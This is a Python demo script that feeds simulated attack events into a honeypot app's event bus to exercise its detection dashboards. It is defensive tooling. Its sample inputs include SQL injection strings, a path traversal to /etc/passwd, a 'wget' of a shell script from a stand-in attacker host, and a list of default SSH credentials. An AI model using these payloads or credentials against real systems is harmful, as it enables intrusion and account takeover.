"""
demo_cluster_attack.py
"""


import sys
import time


sys.path.insert(0, ".")


try:
    from app.capture.event_bus import HoneypotEvent, bus
    from app.intel.signatures import classify_techniques
    LIVE_MODE = True
except ImportError:
    LIVE_MODE = False


SUBNET = "198.51.100"


ATTACK_SEQUENCE = [
    ("/wp-login.php",  "POST", "username=admin&password=admin' OR '1'='1"),
    ("/.env",          "GET",  "/.env"),
    ("/admin",         "GET",  "/admin ../../../etc/passwd"),
    ("/.git/config",   "GET",  "/.git/config"),
    ("/phpmyadmin/",   "GET",  "/phpmyadmin/ union select 1,2,3 --"),
    ("/actuator",      "GET",  "wget http://evil.example/shell.sh"),
]


SSH_CREDS = [
    ("root",     "root"),
    ("root",     "toor"),
    ("admin",    "admin"),
    ("ubuntu",   "ubuntu"),
    ("pi",       "raspberry"),
    ("postgres", "postgres"),
]


CYAN  = "\033[96m"
GREEN = "\033[92m"
RED   = "\033[91m"
AMBER = "\033[93m"
RESET = "\033[0m"
BOLD  = "\033[1m"


def banner():
    print()
    print(BOLD + CYAN + "=" * 58 + RESET)
    print(BOLD + "  COORDINATED SUBNET ATTACK SIMULATION" + RESET)
    print(f"  Subnet  : {SUBNET}.0/24")
    print(f"  IPs     : {SUBNET}.10  to  {SUBNET}.21  (12 distinct IPs)")
    print(f"  Mode    : {'LIVE (events injected into running app)' if LIVE_MODE else 'DRY RUN (no app running)'}")
    print(BOLD + CYAN + "=" * 58 + RESET)
    print()


def inject_http_wave():
    print(BOLD + AMBER + "  [WAVE 1]  HTTP scanning + exploitation attempts" + RESET)
    print()
    for i, (path, method, raw) in enumerate(ATTACK_SEQUENCE):
        ip = f"{SUBNET}.{10 + i}"
        tags = classify_techniques(raw) if LIVE_MODE else {"SIMULATED"}
        tag_str = ", ".join(sorted(tags)) if tags else "plain"
        if LIVE_MODE:
            bus.publish(HoneypotEvent(
                service="http",
                ip=ip,
                path=path,
                method=method,
                raw_text=raw,
                user_agent="python-requests/2.31.0",
                technique_tags=tags,
            ))
        color = RED if any(t in tags for t in ["SQL_INJECTION","RCE_ATTEMPT","CMD_INJECTION"]) else AMBER
        print(f"  {color}[{ip}]{RESET}  {method:<4}  {path:<22}  =>  {color}{tag_str}{RESET}")
        time.sleep(0.45)
    print()


def inject_ssh_wave():
    print(BOLD + GREEN + "  [WAVE 2]  SSH credential stuffing from same subnet" + RESET)
    print()
    for i, (user, passwd) in enumerate(SSH_CREDS):
        ip = f"{SUBNET}.{20 + i}"
        if LIVE_MODE:
            bus.publish(HoneypotEvent(
                service="ssh",
                ip=ip,
                username=user,
                password=passwd,
                raw_text=f"password-auth username={user} password={passwd}",
                technique_tags={"CRED_STUFFING"},
            ))
        print(f"  {GREEN}[{ip}]{RESET}  SSH  {user:<12}  /  {passwd}")
        time.sleep(0.35)
    print()


def summary():
    print(BOLD + CYAN + "=" * 58 + RESET)
    print(BOLD + GREEN + "  Simulation complete." + RESET)
    print()
    print("  What to look for in the app right now:")
    print(f"  {CYAN}  Radar       {RESET}: cyan cluster ring at ~198.51.100 bearing")
    print(f"  {AMBER}  Leaderboard {RESET}: cluster BDI should be HIGH or CRITICAL")
    print(f"  {GREEN}  DNA Gallery {RESET}: 5+ new distinct fingerprint strips")
    print(f"  {RED}  Log         {RESET}: technique badges on every row")
    print(f"  {CYAN}  Timeline    {RESET}: color progression visible (scan to exploit)")
    print(BOLD + CYAN + "=" * 58 + RESET)
    print()


if __name__ == "__main__":
    banner()
    inject_http_wave()
    inject_ssh_wave()
    summary()
